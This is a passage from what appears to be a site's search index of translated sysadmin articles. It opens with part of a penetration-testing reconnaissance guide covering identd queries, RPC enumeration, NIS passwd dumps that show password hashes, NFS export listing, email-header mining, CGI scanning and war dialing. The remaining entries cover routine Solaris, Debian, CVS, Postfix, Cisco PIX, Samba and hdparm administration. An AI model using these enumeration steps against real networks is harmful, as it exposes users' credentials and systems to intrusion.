113 of bosley. Then, for each of the open ports, we connect with a simple telnet client (telnet bosley 664). We then ask identd to give us the desired information (the syntax of requests is ,):\ntelnet bosley 113 Trying 192.168.1.2... Connected to bosley. Escape character is '^]'. 7,32924 7 , 32924 : USERID : OTHER :root 22,32927 22 , 32927 : USERID : OTHER :root 80,32928 80 , 32928 : ERROR : UNKNOWN-ERROR 113, 32926 113 , 32926 : USERID : OTHER :nobody 664,32930 664 , 32930 : USERID : OTHER :root 1024,32931 1024 , 32931 : USERID : OTHER :rpcuser 1025,32932 1025 , 32932 : USERID : OTHER :root 6000,32933 6000 , 32933 : USERID : OTHER :root Connection closed by foreign host. We see here some limitations of nmap. First, the error obtained on port 80 means that in fact there is no web server on bosley. Then, the kdm running with the rpcuser identity suggests that it is actually an RPC program.\nLook carefully at your daemon’s configuration instructions. It’s often possible to replace the username with its UID, but generally, it’s better to disable this server.\nportmap (sunrpc port 111) is the essential server for the proper functioning of services that rely on RPCs (NIS, NFS, rusers, rstat…). The rpcinfo command reveals what’s running on a machine: rpcinfo -p bosley program vers proto port 100000 2 tcp 111 portmapper 100000 2 udp 111 portmapper 100007 2 udp 661 ypbind 100007 1 udp 661 ypbind 100007 2 tcp 664 ypbind 100007 1 tcp 664 ypbind 100024 1 udp 1024 status 100024 1 tcp 1024 status 100011 1 udp 855 rquotad 100011 2 udp 855 rquotad 100005 1 udp 1025 mountd 100005 1 tcp 1025 mountd 100005 2 udp 1025 mountd 100005 2 tcp 1025 mountd 100003 2 udp 2049 nfs 100003 3 udp 2049 nfs 100021 1 udp 1026 nlockmgr 100021 3 udp 1026 nlockmgr 100021 4 udp 1026 nlockmgr 390113 1 tcp 7937 rpcinfo connects to port 111 of the target machine and asks it what’s running on it. portmap has not provided control mechanisms. It is therefore advised to block access to this server via the firewall and tcp-wrapper. In this case, all RPC-based queries (like the next 2) will fail.\nHowever, RPC authentication is based on the client’s IP address. On a local network, it is very easy to spoof an address and thus access all available RPC services.\nA NIS server controls clients authorized to query it by a mechanism called securenets. By default, everyone can connect to the server. Any machine can then declare itself a client of such a NIS database. Once the name of the NIS database is known (it is often the same name as the server), we declare our test machine (kelly - 192.168.1.3) as a client of the NIS server (charly - 192.168.1.1): cat /etc/yp.conf domain charly server charly ypwhich #what is my NIS server? charly #bingo, it responds ;) ypcat -k passwd.byname ... fguest fguest:B4wLh7jxO1eZA:5555:5555:Compte temporaire:/home/fguest:/bin/bash raynal raynal:YP5.ojuxdA/6.:10943:21196:Frederic Raynal:/home/raynal:/bin/bash ... [raynal@kelly intrusion]$ ypcat -k netgroup angels (charly,,) (bosley,,) (kelly,,) (jil,,) (sabrina,,) When the target machine exports directories via NFS, it is sometimes possible to know them using the showmount command: showmount -e charly /var/spool/mail angels /home/web/www (everyone) /home angels /opt/download jil We find here the netgroup angels discovered previously in the NIS database. Directories exported to everyone (indicated by (everyone)) are then accessible on the test machine via mount -t nfs : /mnt/target.\nStill among RPCs, here are some less common servers:\nruserd reveals users connected to a machine:\nrusers -l charly raynal charly:tty1 Jun 16 18:11 :51 raynal charly:pts/ Jun 16 18:11 (:0) raynal charly:pts/ Jun 16 18:11 :19 (:0) raynal charly:pts/ Jun 16 18:11 :06 (:0) raynal charly:pts/ Jun 16 18:11 :20 (:0) raynal charly:pts/ Jun 16 18:59 :03 (bosley) This reveals connection dates and their origins.\nrstatd generates system statistics, read by the rup command: rup -d charly charly 19:15pm up 1:05, load average: 0.09 0.14 0.13 Email Sending linkThe header of an email is full of relevant information such as the version of the SMTP server used or even internal addressing. We obtain the path taken by the email.\nReceived: from smtp1.pigeons.fr ([xxx.xxx.xxx.xxx]) by front.testeur.fr (8.9.3/No_Relay+No_Spam_MGC990224) with ESMTP id OAA00632 for ; Wed, 18 Apr 2001 14:18:11 +0200 (MET DST) Received: from bpigeon ([10.33.11.153]) by smtp1.pigeons.fr (Netscape Messaging Server 3.6) with SMTP id AAA3A01 for ; Wed, 18 Apr 2001 14:14:50 +0200 Message-ID: \u003c004401c0c801$319eff40$990b210a@sit.fr\u003e From: \"Bernard Pigeon\" bernard.pigeon@pigeons.fr To: detoisien@testeur.fr Subject: Test Date: Wed, 18 Apr 2001 14:15:01 +0200 MIME-Version: 1.0 Content-Type: text/plain; charset=\"iso-8859-1\" Content-Transfer-Encoding: 8bit X-Priority: 3 X-MSMail-Priority: Normal X-Mailer: Microsoft Outlook Express 5.00.2919.6600 X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2919.6600 We recover the name and address of an internal machine, the version of the SMTP server and the version of the SMTP client used. It is common to send an email to a non-existent address. Thus, the target’s SMTP server automatically sends back a response with most of the information.\nCGI Scan linkThe default installation of a Web server and/or poor configuration means that many scripts may be present on a Web server. A significant number of these scripts are the source of vulnerabilities. A CGI scanner allows testing for the presence of these scripts on a target server. The hacker can then use them to attack the target machine. The most well-known scanner is whisker.\nperl whisker.pl -h www.pigeons.fr -i -- whisker / v1.3.0a / rain forest puppy / ADM / wiretrip -- = - = - = - = - = - = = Host: www.pigeons.fr - Directory index: / = Server: Microsoft-IIS/4.0 - Appending ::, %2E, or 0x81 to URLs may give script source - Requesting a bogus .pl may give physical path like .idc bug does - if perl is installed - Security settings on directories can be bypassed if you use 8.3 - Warning: Syntax Error: names - http://www.securityfocus.com/templates/archive.pike?list=1 - \u0026date=1999-08-15\u0026msg=37B5D87E.D6600553@urban-a.net - Content-Location: http://10.51.23.246/cfdocs/index.htm + 200 OK: GET /cfdocs/cfmlsyntaxcheck.cfm + 200 OK: GET /cfide/Administrator/startstop.html - can start/stop the server...w00h00 + 200 OK: HEAD /iisadmpwd/aexp4b.htr - gives domain/system name + 200 OK: HEAD /msadc/msadcs.dll - RDS. See RDS advisory, RDP9902 - Need I remind you, do not abuse, kids? We have a list of potentially vulnerable scripts that could be exploited later.\nWar Dialing linkWar Dialing is a somewhat separate technique. Indeed, it consists of scanning an entire set of phone numbers.\nSoftware (Toneloc, THC-Scan…) calls each phone number and detects if it’s a VMB (Voice Mail Box), a fax, a person, a type of ring (busy, no answer…) or a carrier, meaning a modem (or more generally a Remote Access) that answers. The attack following this discovery focuses on discovering a login/password allowing access to the machine behind the modem.\nUsing the Information linkAfter gathering all this information about the target information system, we can plan the rest of the penetration test.\nVulnerability Research linkThis step directly uses the previous data. The objective of the analysis phase is to find vulnerabilities at the network, system, and application levels of the target. These flaws can be found in public databases (such as bugtraq, which is the most well-known list) and on hacker group sites. This research results in establishing a list of exploitable vulnerabilities against the target’s machines.\nIn cases where many machines need to be tested, we can use a vulnerability scanner (such as Nessus). This is software that automates vulnerability discovery. These are maintained in a database that can be updated online. This type of application is very useful but has its limitations. Indeed, such a scanner can report false alerts or, conversely, not detect certain vulnerabilities. Nevertheless, it can complement our list of flaws that we’ll use in the last step.\nVulnerability Exploitation linkThese flaws are exploited using tools available on the Internet or developed for the occasion (mostly in C or Perl). This final phase may lead to the compromise of a machine. Exploitation is very specific and obviously depends on the vulnerabilities discovered.\nConclusion linkThis article focused on gathering information about the target with the objective of an external penetration test (via the Internet). This approach phase is substantially the same for each test, unlike the attack itself. Regarding internal penetration tests, the methodology remains identical but the number of vulnerabilities is often greater and attack techniques are more numerous.\n"
            }
        );
    index.add(
            {
                id:  817 ,
                href: "\/Patcher_sa_Solaris\/",
                title: "Patching Solaris",
                description: "A guide on how to detect, retrieve and install patches for Solaris systems.",
                content: "Introduction linkI won’t go into detailed explanation of what a patch is, but you should know that by applying patches (fixes), you can eliminate bugs and security vulnerabilities.\nDetecting Patches link showrev -p Patch: 106793-01 Obsoletes: Requires: Incompatibles: Packages: SUNWhea . . . patchadd -p Patch: 106793-01 Obsoletes: Requires: Incompatibles: Packages: SUNWhea . . . These versions should be identical. If they’re not, it means a patch has been applied.\nYou can also see the different system patches here:\nls /var/sadm/patch 107558-05 107594-04 107630-01 107663-01 107683-01 107696-01 107817-01 107582-01 107612-06 107640-03 Retrieving Patches linkFor France, here is the address for Solaris patches: http://sunsolve.sun.fr\nThen, on Sun’s FTP site, get the latest version:\ncd /var/tmp ftp sunsolve.sun.com Connected to sunsolve.sun.com. (output omitted) Name (sunsolve:usera): anonymous 331 Guest login ok, send your complete e-mail address as password. Password: yourpassword (output omitted) ftp\u003e bin 200 Type set to I. ftp\u003e cd /patchroot/reports ftp\u003e get public_patch_report (output omitted) ftp\u003e cd /patchroot/clusters ftp\u003e get 10_SunAlert_Patch_Cluster.README (output omitted) ftp\u003e cd /patchroot/current_unsigned ftp\u003e mget 112605* mget 112605-01.zip? y (output omitted) mget 112605.readme? y ftp\u003e bye Decompress the patch:\n/usr/bin/unzip 105050-01.zip Implementing Patches linkHere are the existing commands:\npatchadd - Install a patch patchrm - Remove a patch smpatch - utility to download and install a patch patchadd linkLet’s install the patch:\ncd /var/tmp patchadd 105050-01 Checking installed patches... Verifying sufficient filesystem capacity (dry run method) Installing patch packages... Patch number 105050-01 has been successfully installed. See /var/sadm/patch/105050-01/log for details. Patch packages installed: SUNWhea pathrm linkTo remove a patch:\npatchrm 105050-01 Checking installed packages and patches... Backing out patch 105050-01... Patch 105050-01 has been backed out. Don’t forget to restart the machine after applying a patch.\nsmpatch linkThere’s also another utility that allows you to automatically download and install (or remove) a patch:\nsmpatch get -L patchpro.patch.source patchpro.download.directory https://updateserver.sun.com/solaris/ /var/sadm/spool "
            }
        );
    index.add(
            {
                id:  818 ,
                href: "\/Debian_:_Modification_des_outils_par_d%C3%A9faut_%28ex:_Editor%29\/",
                title: "Debian: Changing Default Tools (e.g., Editor)",
                description: "How to change default tools preferences in Debian Linux, particularly the default editor using update-alternatives or manual exports.",
                content: "A nice command exists in Debian to modify your preferences. To change the default editor, for example, do this:\nupdate-alternatives --config editor Otherwise, manually, you can do this:\nexport EDITOR=vim visudo "
            }
        );
    index.add(
            {
                id:  819 ,
                href: "\/Debian_:_Fini_les_erreurs_de_d%C3%A9pendances_quand_vous_voulez_configurer_des_sources\/",
                title: "Debian: No More Dependency Errors When Configuring From Source",
                description: "Learn how to use auto-apt in Debian to automatically resolve missing dependencies when compiling from source.",
                content: "Imagine you want to install the latest version of xyz from source on your Debian system. You run ./configure and… BLAM!!! You get a ton of errors because of libraries that aren’t installed.\nWell, this won’t happen anymore, thanks to a very user-friendly utility called auto-apt.\nTo install it:\napt-get install auto-apt Then, enjoy the pleasure of ./configure without errors. To use it, just type:\nauto-apt run ./configure instead. That’s all. If apt detects an error due to a missing file, it will kindly offer to install it for you.\nJust remember to update its databases regularly with:\nauto-apt update auto-apt updatedb auto-apt update-local Note: auto-apt works with any command that might need missing files: auto-apt run command.\n"
            }
        );
    index.add(
            {
                id:  820 ,
                href: "\/Mise_en_place_des_ACLs_pour_CVS\/",
                title: "Setting up ACLs for CVS",
                description: "A guide on how to install and configure ACLs for CVS repositories.",
                content: "Installation linkDownload the latest pre-patched version of CVSACL from the internet (http://cvsacl.sourceforge.net), then extract it.\nwget http://switch.dl.sourceforge.net/sourceforge/cvsacl/cvs-1.11.22-cvsacl-1.2.5-patched.tar.gz tar -xzvf cvs-1.11.22-cvsacl-1.2.5-patched.tar.gz Configuration, compilation and installation:\ncd cvs-1.11.22-cvsacl-1.2.5-patched.tar.gz ./configure make make install If CVS is properly installed with its CVSACL Patch, the command cvs --version should output:\nConcurrent Versions System (CVS) 1.11.22 (client/server) with CVSACL Patch 1.2.5 (cvsacl.sourceforge.net) Configuration linkPreparation of the repository linkIf the repository doesn’t exist yet link Create the repository directory (the directory can be created anywhere, preferably in a location with sufficient space) mkdir -p /home/cvsadmin/cvsroot Create a symbolic link to the repository ln -s /home/cvsadmin/cvsroot /usr/local/cvsroot Define the $CVSROOT variable and initialize the repository export CVSROOT=/usr/local/cvsroot cvs -d $CVSROOT init After this operation, a CVSROOT directory will be created at the root of the repository. This directory, seen as the first module of the repository, contains all the CVS configuration files.\nIf the repository already exists link Copy the aclconfig.default file from the sources to the CVSROOT folder at the root of the repository. sudo cp /root/cvs-1.11.22-cvsacl-1.2.5-patched.tar.gz/aclconfig.default $CVSROOT/CVSROOT Rename the file to aclconfig sudo mv $CVSROOT/CVSROOT/aclconfig.default $CVSROOT/CVSROOT/aclconfig Configuration of Lockfiles linkCreate a .lock directory at the root of the repository (/usr/local/cvsroot) and allow full access to all users:\nmkdir /usr/local/cvsroot/.lock chmod 777 /usr/local/cvsroot/.lock Edit the config file in /usr/local/cvsroot/CVSROOT/ and modify it as follows:\n# Put CVS lock files in this directory rather than directly in the repository. LockDir=/home/cvsadmin/cvsroot/.lock Configuration of users linkCVSACL offers the possibility to manage access rights by group either by using system groups (/etc/group) or by using its own group file. It’s preferable to use the latter method as it allows for CVS rights management completely independent from the system. To do this, edit the aclconfig file in /usr/local/cvsroot/CVSROOT and modify it as follows:\n# Set `UseSystemGroups' to yes to use system group definitions (/etc/group). #UseSystemGroups=yes # Set `UseCVSGroups' to yes to use another group file. UseCVSGroups=yes Then create the group file in /usr/local/cvsroot/CVSROOT:\ntouch /usr/local/cvsroot/CVSROOT/group The group file must be in the form “group:user1, user2, user3 …”\nGroups are totally independent of system groups and can bear any name.\nUsers are those from the system. You will need to create them with useradd as well as their home directory.\nConfiguration of ACLs linkFirst, define “root” as the CVS owner.\nThis will allow them to perform all CVS tasks and administer access to the repository.\ncvs -d /usr/local/cvsroot racl root:p -r ALL ALL Definition of rights linkSyntax of the rights assignment command:\ncvs -d racl : no access Command line character: n No possible action on the repository\nread Command line character: r Read-only. With these rights, only the following actions are possible: annotate, checkout, diff, export, log, rannotate, rdiff, rlog, status.\nwrite Command line character: w This permission only allows cvs commit/checkin actions. It does not allow adding/removing a file from/to the repository; other permissions are defined for this.\ntag Command line character: t This permission authorizes the cvs tag and rtag sub-commands, so it is possible to control Tag and Untag operations. The “t” permission includes the “r” permission because reading is mandatory for tagging. However, “t” does not include writing; it is not possible to commit with just this permission.\ncreate Command line character: c The “c” permission authorizes the creation/deletion of files from/to the repository but once again this permission does not include “w”; we can only import or export files. After adding a file, it is necessary to perform a commit which will be accepted because we are adding a file, not modifying it.\ndelete Command line character: d “d” authorizes deletion and does not include “w”\nfull access except admin rights Command line character: a “a” includes all permissions listed above except ACL management rights.\nacl admin Command line character: p “p” indicates that the user is an owner. They have full control of the repository and can manage ACLs.\nExample of ACL link cvs -d /usr/local/cvsroot group1:r -r ALL ALL cvs -d /usr/local/cvsroot group2:n -r ALL module1 cvs -d /usr/local/cvsroot user1:w -Rr ALL module2 The first line authorizes reading on all directories of the repository for the group “group1”\nThe second line prohibits access to “module1” for the group “group2”\nThe third line allows “user1” to modify files in ALL subdirectories and files of “module2” (-R = recursively)\n"
            }
        );
    index.add(
            {
                id:  821 ,
                href: "\/Rkhunter_:_D%C3%A9tection_de_rootkits_et_malwares\/",
                title: "Rkhunter: Detection of rootkits and malware",
                description: "This article explains how to use Rkhunter to detect rootkits, backdoors and malware on Unix systems by comparing MD5 hashes of important files against a database of known values.",
                content: "Introduction linkRkhunter (Rootkit Hunter) is a Unix program that detects rootkits, backdoors, and exploits. It works by comparing MD5 hashes of important files with known hashes that are accessible from an online database. It can detect directory permissions, hidden files, suspicious strings in the kernel, and can perform specific tests for Linux and FreeBSD.\nHowever, it’s worth noting that since 2005, we’ve known that it’s possible to create distinct files with the same MD5 signature due to a mathematical invariance property of this process.\nInstallation linkTo install Rkhunter, visit the website https://www.rootkit.nl/ or install it on Debian with:\napt-get install rkhunter Configuration linkThe advantage of this software is that there’s nothing to configure - it sets itself up automatically and runs daily, sending email alerts when issues are detected. You might encounter MD5 errors related to updates or other changes. To resolve this problem, update rkhunter:\nrkhunter --update "
            }
        );
    index.add(
            {
                id:  822 ,
                href: "\/Postgrey_:_Mise_en_place_de_greylists_pour_lutter_contre_le_spam\/",
                title: "Postgrey: Setting Up Greylists to Fight Spam",
                description: "This guide explains how to set up and configure Postgrey, a greylisting implementation for Postfix to effectively combat spam emails.",
                content: "Introduction linkThe postgrey package is a greylisting implementation for postfix. It is very easy to set up and can stop 99.99% of spam in conjunction with blacklisting.\nFirst back up everything - just in case! ;)\nYou should let any users know that greylisting may delay some emails, or otherwise pacify the end user community (Tip: offer them free software if they need compensating for delayed email).\nInstallation linkAs root or your preferred way of getting root privileges:\napt-get install postgrey You should have a policy server running on port 6000 of localhost, check with netstat:\nnetstat -anp | grep 60000 tcp 0 0 127.0.0.1:60000 0.0.0.0:* LISTEN 18478/postgrey.pid Configuration linkNow you need to add a line to /etc/postfix/main.cf to tell Postfix to use the new postgrey policy daemon. Since this is a restriction on SMTP traffic you need to add the following to “smtpd_recipient_restrictions”:\ncheck_policy_service inet:127.0.0.1:60000 Now reload postfix, postfix reload (me being a lazy luddite often runs /etc/init.d/postfix restart which is slower, but saves remembering which changes require what sort of restart, and what the syntax for this particular service is).\nThe only gotcha is that if the default Greylist text isn’t right for you, then you probably want to read about this Debian bug 298832 to save some frustrating attempts to edit the text issued. This mostly affects people with many domains, where “postmaster@” isn’t the preferred address for support, or to preserve corporate identity.\nPostgrey is reliable - very - but you want to know if it is not running as Postfix will defer email if it can’t speak to a policy daemon. Set up some sort of test!\nGreylisting isn’t for everyone. Postgrey by default has some exceptions for email servers that don’t behave, and accounts to exempt in /etc/postgrey, and you can of course use these to whitelist servers. After 5 successful deliveries (by default) postgrey will whitelist a server, so you quickly get a whitelist of trusted servers, some people suggest reducing this default from 5. There is a script in /usr/share/doc/postgrey/postgrey_clients_dump which lists the whitelisted servers, it doesn’t have execute permissions so you have to:\nperl /usr/share/doc/postgrey/postgrey_clients_dump The documentation directory also has contact details for the mailing list - it is very quiet - I think it just works. Beware greylisting will delay things like password emails for signing up to things like this website, but for many this is a price worth paying for the relief from spam.\nConfiguration of Postgrey link Hand in hand with greylisting is blacklisting. Part of the idea with greylisting is to delay the spammer till others have identified the poor exploited spambots. I looked around and picked the SBL-XBL blacklist. Again a restriction on SMTP so to the “smtpd_client_restrictions” add: reject_rbl_client zen.spamhaus.org You’ll have to read the documentation to figure out what order to put your “smtpd_recipient_restrictions”, as order can matter terribly - you’ve been warned.\nThat single one line change is estimated to stop 60% of spam!\nThe other restriction I use is implemented by adding this line to /etc/postfix/main.cf mime_header_checks = regexp:/etc/postfix/mime_header_checks.regexp Where the file /etc/postfix/mime_header_checks.regexp has:\n/filename=\\\u0026quot;?(.*)\\.(bat|chm|cmd|com|cpl|do|exe|hta|jse|rm|scr|pif|vbe|vbs|vxd|xl|zip)\\\u0026quot;?$/ REJECT For security reasons attachments of this type are rejected. /^\\s*Content-(Disposition|Type).*name\\s*=\\s*\u0026quot;?(.+\\.(lnk|cpl|asd|hlp|ocx|reg|bat|c[ho]m|cmd|exe|dll|vxd|pif|scr|hta|jse?|sh[mbs]|vb[esx]|ws[fh]|wav|mov|wmf|xl))\u0026quot;?\\s*$/ REJECT Attachment type not allowed. File \u0026quot;$2\u0026quot; has the unacceptable extension \u0026quot;$3\u0026quot; Note that is only two lines if you cut and paste it.\nThis is just taken and hacked from earlier examples on the Postfix mailing list, there may be better ways. This hasn’t caught much email recently till I added “.zip” to the list, you may well not want the “.zip” (or other types), but I was getting many many viruses with .zip for every genuine attempt.\nCurrently the Greylisting and RBL stop virtually all the virus email traffic, so the MIME type filtering is almost unneeded, but I figure the few extra viruses caught will save some antivirus program (or end user) a little bit of effort. If the regular expression change worries you, leave it out.\nIt may have taken a fair bit of explaining, but with the addition of one package, a three line change to main.cf, and two regular expressions, the advice in this article should stop the vast majority of spam. At least till the spammers start emulating SMTP servers. I still, alas, get the Nigerian scams - seems they just use disposable email accounts on real email servers. Greylisting also doesn’t handle backscatter if people spam in your name, but it can spread the pain on your email server. "
            }
        );
    index.add(
            {
                id:  823 ,
                href: "\/Configuration_de_base_d\u0027un_Cisco_Pix\/",
                title: "Basic Configuration of a Cisco PIX",
                description: "Learn the basics of Cisco PIX firewall configuration including VPN setup, user administration, and network access rules",
                content: "Cisco Basics linkIntroduction linkIn graphical mode it’s not too complicated, but in command line - oh boy - the PIX is challenging to configure!\nIt’s Cisco, so it uses proprietary commands but with a touch of Unix. For example, the grep command works :-)\nLet’s get started. Connect and enter your password.\nThe Basics link Switch to enable mode to get admin privileges: en Then a show running-config to see the current configuration: sh run Once you’ve viewed the configuration and decided to add something, do a configure terminal: conf t To exit the current mode: Ctrl+z or exit Are you sure? Then save to memory (write memory): wr m Adding and Removing Commands link To add a NAT rule for example, copy the existing lines, then copy/paste: static (dmz,outside) tcp 193.252.19.3 2099 SRV-FRONT 2099 netmask 255.255.255.255 0 0 To delete this rule: no static (dmz,outside) tcp 193.252.19.3 2099 SRV-FRONT 2099 netmask 255.255.255.255 0 0 Adding an Admin User linkTo add a Cisco admin user:\nusername login password pass privilege 15 Creating an Address Pool for the Client linkHere’s an example of creating an address pool for client access:\nname CLIENT_IP VANLANSCHOT_TEST name CLIENT_IP VANLANSCHOT_PROD object-group network VANLANSCHOT_RANGE network-object VANLANSCHOT_TEST 255.255.255.255 network-object VANLANSCHOT_PROD 255.255.255.255 access-list radianz_access_in permit tcp object-group VANLANSCHOT_RANGE host LOCAL_SERVER_IP eq 9024 pdm location VANLANSCHOT_TEST 255.255.255.255 radianz pdm location VANLANSCHOT_PROD 255.255.255.255 radianz route radianz VANLANSCHOT_TEST 255.255.255.255 GATEWAY_IP 1 route radianz VANLANSCHOT_PROD 255.255.255.255 GATEWAY_IP 1 VPN Setup linkIntroduction linkTo create a VPN, you need:\nThe remote IP of the person and their local IP/local network through which they will connect. Ask the person if they want the shared key system (pre-shared key)? Provide this type of encryption: DES-MD5 - Group 2 Creation link # Access List # Enter the client's local IPs access-list inside_outbound_nat0_acl permit ip host OUR_LOCAL_IP host CLIENT_LOCAL_IP access-list outside_cryptomap_240 permit ip host OUR_LOCAL_IP host CLIENT_LOCAL_IP # IPSec Encryption #crypto ipsec transform-set ESP-3DES-MD5 esp-3des esp-md5-hmac # Crypto Map Configuration # This is the line that reads the policy # Check if 240 exists, otherwise add + crypto map outside_map 240 ipsec-isakmp crypto map outside_map 240 match address outside_cryptomap_240 #crypto map outside_map 240 set pfs group2 crypto map outside_map 240 set peer CLIENT_ROUTER_IP crypto map outside_map 240 set transform-set ESP-3DES-MD5 #crypto map outside_map 240 set security-association lifetime seconds 86400 kilobytes 10000 #crypto map outside_map interface outside # ISAKMP Pre-Shared Key # Enter the shared key here #isakmp enable outside isakmp key PRE-SHARED_KEY address CLIENT_ROUTER_IP netmask 255.255.255.255 no-xauth no-config-mode #isakmp identity address # ISAKMP Encryption # Add if it doesn't exist isakmp policy 160 authentication pre-share isakmp policy 160 encryption 3des isakmp policy 160 hash md5 isakmp policy 160 group 2 isakmp policy 160 lifetime 86400 In case of conflicts between networks, it may be necessary to NAT our network. For this, don’t create the access-list inside_outbound_nat0_acl but add the following lines:\naccess-list nat_to_customer permit ip host OUR_LOCAL_IP host CLIENT_LOCAL_IP static (inside,outside) OUR_NATED_IP access-list nat_to_customer 0 0 Enabling Debug Mode for VPN link debug crypto isakmp debug crypto ipsec Add “2” at the end of the line to increase the debug level.\nBe sure to disable debug mode when finished as it consumes resources.\nno debug crypto isakmp no debug crypto ipsec Closing a VPN Connection linkEnter configuration mode and execute the following command:\nclear crypto sa peer ip_address_of_the_remote_host "
            }
        );
    index.add(
            {
                id:  824 ,
                href: "\/Synchronisation_de_boites_mails_IMAP\/",
                title: "IMAP Mailbox Synchronization",
                description: "How to synchronize IMAP mailboxes between two remote servers using imapsync",
                content: "IMAP Mailbox Synchronization linkHow do you synchronize a mailbox between two remote servers? A small tool called Imapsync exists for this purpose!\nwarning Warning: This software consumes a lot of CPU resources! To install it, nothing complicated:\napt-get install imapsync Next, let’s create a folder in our home directory called .imapsync.\nmkdir ~/.imapsync In this folder, we’ll store the IMAP password for the account(s). The first file corresponds to the first server, and the second file to the second server:\necho \"password1\" \u003e ~/.imapsync/secret1 echo \"password2\" \u003e ~/.imapsync/secret2 You can also use the same file if you use the same password (as in my case).\nFor security reasons, let’s change the permissions of this file(s):\nchmod 600 ~/.imapsync/secret* Then, we simply call the command with the appropriate arguments:\nimapsync --syncinternaldates --host1 fire --ssl1 --user1 deimos --passfile1 ~/.imapsync/secret --host2 burnin --ssl2 --user2 deimos --passfile2 ~/.imapsync/secret The parameters in italics should be adapted according to your needs. Here are some brief explanations of the options:\n--syncinternaldates: fixes date issues with Eudora, Thunderbird... --ssl1 and --ssl2: allows IMAP connections with SSL support. Remove these arguments if they don't apply to you. Given the CPU load it generates, it’s recommended to redefine the process priority. We can combine everything in a crontab entry to automate the process:\n0 */1 * * * nice -n +19 imapsync --syncinternaldates --host1 fire --ssl1 --user1 deimos --passfile1 ~/.imapsync/secret --host2 burnin --ssl2 --user2 deimos --passfile2 ~/.imapsync/secret And that’s it, we’re all set!\n"
            }
        );
    index.add(
            {
                id:  825 ,
                href: "\/Windows_:_Rafra%C3%AEchir_les_politiques_de_s%C3%A9curit%C3%A9_%28GPO%29\/",
                title: "Windows: Refreshing Security Policies (GPO)",
                description: "How to refresh Windows security policies (GPO) without disconnecting from the session.",
                content: "Instead of closing and reopening your session to verify that security policies are working properly, there are commands to avoid disconnecting.\nWindows 2000: secedit /refreshpolicy machine_policy /enforce Windows XP: gpupdate /force "
            }
        );
    index.add(
            {
                id:  826 ,
                href: "\/Corbeille_r%C3%A9seau\/",
                title: "Network Recycle Bin",
                description: "How to set up a network recycle bin with Samba 3 on Red Hat Enterprise Linux",
                content: "There is a network recycle bin for each share. To set this up, here are the files to configure with the necessary options. My tests were done on a Red Hat Enterprise 4 with Samba 3. This configuration only works with Samba 3. For earlier versions, it’s a .recycle file with a different content. But let’s proceed with the configuration:\nEdit the smb.conf file and add these lines:\nvfs objects = recycle recycle:exclude = *.tmp *.temp *.o *.obj ~$* recycle:keeptree = True recycle:touch = True recycle:versions = True recycle:noversions = .doc|.xls|.ppt recycle:repository = .recycle recycle:maxsize = 0 A small script in the crontab to remove items older than 1 week and you’re good to go :-)\n#!/bin/sh # # This is the name of the Dust bin recyclename=\".recycle\" for dustshare in \"/home/data/$recyclename\" \"/home/sales/$recyclename\" \"/home/share/$recyclename\" ; do test -d $dustshare || mkdir $dustshare \u0026\u0026 chown nobody:nobody $dustshare \u0026\u0026 chmod 700 $dustshare find $dustshare -mtime +168 -exec rm -f {} \\; done Of course, don’t forget to restart Samba!\n/etc/init.d/smbd restart "
            }
        );
    index.add(
            {
                id:  827 ,
                href: "\/Hdparm_:_Optimiser_les_acc%C3%A8s_disques\/",
                title: "Hdparm: Optimizing Disk Access",
                description: "How to optimize disk and optical drive performance on Linux systems using hdparm utility.",
                content: "Introduction linkWhen you copy large files from one hard drive to another or copy the contents of a CD-ROM to a hard drive, you may have noticed a significant slowdown in your system. During the transfer, music might begin to crackle, for example, or DVD-ROM playback is particularly slow.\nConsiderations Throughout this article, we consider that your hard drive is the master on the first IDE interface, meaning it is connected to the entry point /dev/hda.\nPrerequisites linkKernel configuration linkYour kernel must support DMA. You must have the following options when compiling your kernel:\nSection Kernel Option As module or built-in? ATA/IDE/MFM/RLL support IDE, ATA and ATAPI Block devices / Generic PCI IDE chipset support Built-in ATA/IDE/MFM/RLL support IDE, ATA and ATAPI Block devices / Generic PCI bus-master DMA support Built-in ATA/IDE/MFM/RLL support IDE, ATA and ATAPI Block devices / Use PCI DMA by default when available Built-in You must replace XXXXXXXX with the chipset reference of your motherboard. Refer to your hardware user manual to find this reference.\nThe hdparm package linkThe tool we will use to test and optimize the hard disk transfer rate is called hdparm, which corresponds to the package of the same name. We install this package:\napt-get install hdparm Note that certain options must be activated in the kernel to enable the DMA channel of your IDE devices. All kernels available for Debian GNU/Linux have these options enabled, but if it’s a kernel you’ve compiled yourself, it’s better to check that the following options are present:\nImproving the transfer rate of your hard drives linkTo check the transfer rate of your hard drive, simply type the following command:\nhdparm -tT /dev/hda Without optimization, you should get something similar to this:\n/dev/hda: Timing buffer-cache reads: 128 MB in 1.06 seconds = 120.75 MB/sec Timing buffered disk reads: 64 MB in 35.70 seconds = 1.79 MB/sec The speed of a hard drive is generally between 10 and 30 MB/s for the second test. You can see that here the hard drive is horribly slow. We will therefore fix this problem by activating the DMA controller and 32-bit transfer for your hard drive. The DMA controller (acronym for Direct Memory Access) is a process that allows access to RAM without going through the processor. You can activate this option without any worries, using hdparm.\nTo activate this optimization:\nhdparm -c1 -d1 /dev/hda Which produces the following result:\n/dev/hda: setting 32-bit I/O support flag to 1 setting using_dma to 1 (on) I/O support = 1 (32-bit) using_dma = 1 (on) In the above command:\n-c1 corresponds to activating 32-bit transfer -d1 corresponds to activating the DMA channel You can test your hard drive again to verify that the optimization does produce a performance gain. The rate is on average multiplied by 15. However, this value can vary depending on your hardware!\nImproving the transfer rate of your CD-ROM or DVD-ROM drive linkThe optimization of a CD-ROM or DVD-ROM drive can be done regardless of the drivers you use to manage your CD-ROM drives. Thus, for CD-ROM to CD-ROM copies, SCSI emulation is absolutely essential. So, whether you have SCSI emulation or not, you should type the following command:\nhdparm -c1 -d1 /dev/hdc You should then get the following result:\n/dev/hda: setting 32-bit I/O support flag to 1 setting using_dma to 1 (on) I/O support = 1 (32-bit) using_dma = 1 (on) Normally your transfer rate should have been multiplied by 2 and you can notice that DVD-ROM playback is much smoother. In addition, to reduce the noise made by the CD-ROM or DVD-ROM drive, you can choose its reading speed with this command (where 40 corresponds to the chosen speed, i.e., 40X):\nhdparm -E 40 /dev/hdc Making your optimizations permanent linkThe optimizations you just made are certainly interesting, but at the next restart, you’ll have to do everything again. To overcome this problem, we will write them in the configuration file of the hdparm program.\nYou need to edit the /etc/hdparm.conf file. This file contains in the first part all the options you can use. You then need to define for each of your disks the list of options you want to activate.\nThe following block activates DMA and 32-bit access for the /dev/hda disk.\n/dev/hda { quiet dma = on io32_support = 1 } quiet parameter The quiet parameter 